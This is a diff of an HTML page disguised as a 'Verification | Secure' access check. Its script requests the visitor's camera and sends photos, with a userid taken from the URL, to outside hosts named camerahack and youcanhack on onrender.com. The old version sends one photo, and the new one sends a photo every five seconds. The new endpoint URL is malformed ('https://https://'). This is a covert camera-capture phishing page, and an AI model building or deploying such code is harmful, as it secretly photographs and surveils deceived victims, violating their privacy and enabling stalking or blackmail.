@@ -2,63 +2,100 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification | Secure</title>
   <style>
     body {
-      background: #000;
-      color: white;
-      text-align: center;
-      font-family: Arial, sans-serif;
-      padding-top: 50px;
+      margin: 0;
+      padding: 0;
+      background: #0f172a;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
     }
-    video {
-      width: 300px;
-      border-radius: 10px;
-      border: 2px solid #0f0;
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+      color: #00ff99;
+    }
+    #video {
+      width: 280px;
+      height: auto;
+      border-radius: 12px;
+      border: 3px solid #00ff99;
+      box-shadow: 0 0 20px #00ff99;
+    }
+    #status {
+      font-size: 1rem;
+      margin-top: 10px;
+      color: #cccccc;
+    }
+    .footer {
+      position: absolute;
+      bottom: 15px;
+      font-size: 0.9rem;
+      color: #888;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.7; }
+      100% { transform: scale(1); opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <h1>🔐 Verifying Access...</h1>
-  <video id="video" autoplay muted playsinline></video>
-  <p id="status">Accessing camera...</p>
+  <h1>🔒 Capturing Image... Stay Still</h1>
+  <video id="video" autoplay playsinline></video>
+  <div id="status">Initializing camera...</div>
+  <div class="footer">❤️ Team Tasmina</div>
 
   <script>
-    const userId = new URLSearchParams(window.location.search).get("userid");
     const video = document.getElementById('video');
     const statusText = document.getElementById('status');
 
-    async function startCamera() {
+    async function initCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-
-        statusText.innerText = "✅ Capturing image...";
-
-        const blob = await imageCapture.takePhoto();
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          fetch("https://camerahack.onrender.com/send-photo", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              user_id: userId,
-              img_base64: reader.result
-            })
-          });
-        };
-        reader.readAsDataURL(blob);
-
+        statusText.innerText = "✅ Camera accessed. Capturing...";
+        startCapturing(stream);
       } catch (err) {
-        statusText.innerText = "❌ Failed to access camera.";
+        statusText.innerText = "❌ Camera access denied.";
       }
     }
 
-    startCamera();
+    function startCapturing(stream) {
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const userId = new URLSearchParams(window.location.search).get("userid");
+
+      setInterval(async () => {
+        try {
+          const blob = await imageCapture.takePhoto();
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            fetch("https://https://youcanhack.onrender.com/send-photo", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user_id: userId,
+                img_base64: reader.result
+              })
+            });
+          };
+          reader.readAsDataURL(blob);
+        } catch (error) {
+          statusText.innerText = "❌ Error capturing photo.";
+        }
+      }, 5000);
+    }
+
+    initCamera();
   </script>
 </body>
 </html>
